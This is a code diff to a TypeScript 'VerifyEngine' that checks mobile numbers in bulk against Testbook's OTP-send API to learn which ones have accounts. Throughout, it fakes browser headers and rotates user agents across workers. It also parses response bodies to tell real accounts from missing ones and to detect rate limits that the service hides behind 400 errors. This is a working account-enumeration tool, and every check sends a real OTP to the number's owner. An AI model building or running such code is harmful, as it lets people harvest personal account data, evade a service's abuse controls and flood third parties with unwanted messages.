@@ -358,32 +358,86 @@ class VerifyEngine {
   private async verifyNumber(mobile: string, workerId: number): Promise<VerifyResult> {
     try {
       const ua = USER_AGENTS[workerId % USER_AGENTS.length];
+      // Use same format as main repo: number in URL + body (no 91 prefix in query param)
+      const url = `https://api.testbook.com/api/v2/otp/send?emailOrMobile=${mobile}`;
 
-      const response = await fetch(
-        `https://api.testbook.com/api/v2/otp/send?emailOrMobile=91${mobile}`,
-        {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-            'Accept': 'application/json, text/plain, */*',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'User-Agent': ua,
-            'Origin': 'https://testbook.com',
-            'Referer': 'https://testbook.com/',
-            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
-            'sec-ch-ua-mobile': workerId % 3 === 0 ? '?1' : '?0',
-            'sec-ch-ua-platform': workerId % 2 === 0 ? '"Windows"' : '"macOS"',
-          },
-        }
-      );
+      const response = await fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': 'application/json, text/plain, */*',
+          'Accept-Language': 'en-US,en;q=0.9',
+          'User-Agent': ua,
+          'Origin': 'https://testbook.com',
+          'Referer': 'https://testbook.com/',
+          'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
+          'sec-ch-ua-mobile': workerId % 3 === 0 ? '?1' : '?0',
+          'sec-ch-ua-platform': workerId % 2 === 0 ? '"Windows"' : '"macOS"',
+        },
+        body: JSON.stringify({ emailOrMobile: mobile }),
+      });
 
       if (response.status === 429) {
         this.rateLimited++;
         return { mobile, status: 'rate_limited', statusCode: 429 };
       }
 
+      // Handle 400 — parse body to check if it's rate limit or genuine not_found
+      if (response.status === 400) {
+        let body400: any = {};
+        try { body400 = await response.json(); } catch {}
+        const msg400 = (body400.message || '').toLowerCase();
+        
+        // Check if 400 is rate limit in disguise
+        if (msg400.includes('rate') || msg400.includes('limit') || msg400.includes('too many') || 
+            msg400.includes('maximum') || msg400.includes('throttl') || msg400.includes('exceed')) {
+          this.rateLimited++;
+          return { mobile, status: 'rate_limited', statusCode: 400 };
+        }
+        
+        // Log first 400 for debugging
+        if (this.totalProcessed < 5) {
+          this.log(`🔍 [${this.repoId}] First 400 for ${mobile}: ${JSON.stringify(body400).substring(0, 200)}`);
+        }
+        
+        // 400 = not found (invalid number / no account)
+        return { mobile, status: 'not_found', statusCode: 400 };
+      }
+
       if (response.status === 200) {
-        // OTP sent = number has Testbook account = VERIFIED
+        // CRITICAL: Must parse response body to determine verified vs not_found
+        let data: any = {};
+        try { data = await response.json(); } catch {}
+        
+        // OTP sent successfully = account exists = VERIFIED
+        if (data.success === true) {
+          return { mobile, status: 'verified', statusCode: 200 };
+        }
+        
+        // 200 but success=false with specific messages = NOT FOUND
+        if (data.success === false) {
+          const msg = (data.message || '').toLowerCase();
+          
+          // Rate limit message in 200 body
+          if (msg.includes('rate') || msg.includes('limit') || msg.includes('too many') || 
+              msg.includes('maximum') || msg.includes('throttl')) {
+            this.rateLimited++;
+            return { mobile, status: 'rate_limited', statusCode: 200 };
+          }
+          
+          // Not found messages
+          if (msg.includes('invalid') || msg.includes('not found') || 
+              msg.includes('no account') || msg.includes('unregistered')) {
+            return { mobile, status: 'not_found', statusCode: 200 };
+          }
+        }
+        
+        // Unexpected 200 response — log it
+        if (this.totalProcessed < 5) {
+          this.log(`🔍 [${this.repoId}] Unexpected 200 for ${mobile}: ${JSON.stringify(data).substring(0, 200)}`);
+        }
+        
+        // Default: if 200 and can't parse, treat as verified (optimistic)
         return { mobile, status: 'verified', statusCode: 200 };
       }
 
